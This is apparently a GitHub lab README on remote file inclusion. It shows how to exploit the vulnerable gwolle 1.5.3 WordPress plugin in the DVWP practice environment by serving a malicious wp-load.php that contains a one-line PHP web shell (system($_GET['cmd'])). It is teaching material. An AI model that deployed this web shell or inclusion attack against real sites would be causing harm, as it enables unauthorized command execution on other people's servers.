# RFI-Remote-file-inclusion-
RFI lab

As the name of this technique suggests, a remote file inclusion occurs when a webserver points at a file, directory, etc. that is not hosted on the webserver itself. We can therefore find ways for it to execute arbitrary code :).

For example, let’s take a look at the following wordpress plugin: gwolle-1.5.3

To exploit the webserver just clone the github directory and follow the installation procedure:

```Bash
git clone https://github.com/vavkamil/dvwp
```
We also have to download the vulnerable version of gwolle which can be found easily in the wordpress plugins directory: https://downloads.wordpress.org/plugin/gwolle-gb.1.5.3.zip

With the help of searchsploit we can try to find an exploit (which there is ofc!)

![gwolle_exploit](https://github.com/user-attachments/assets/2d6b2721-4ba0-4e1b-8e67-0ac219f79262)

Let’s have a look at the exploit.
![url_vuln](https://github.com/user-attachments/assets/bfebf5aa-497f-4648-ac78-d073b66b515f)

The vulnerability lies in parameter which sends a GET request to a file called “wp-load.php”. As the attackers, we can think about creating a malicious “wp-load.php” file stored on a local server:
```Python
# Setting up a simple http server
python3 -m http.server 1234
```

```PHP
# Creating our malicious wp-load.php
<?php
	system($_GET["cmd"]);
?>
```

Now let’s take a look at the server’s response:

![response](https://github.com/user-attachments/assets/15e5a7d0-3af7-48c6-b2c5-44515c31a590)

We have achieved remote code execution on the server!
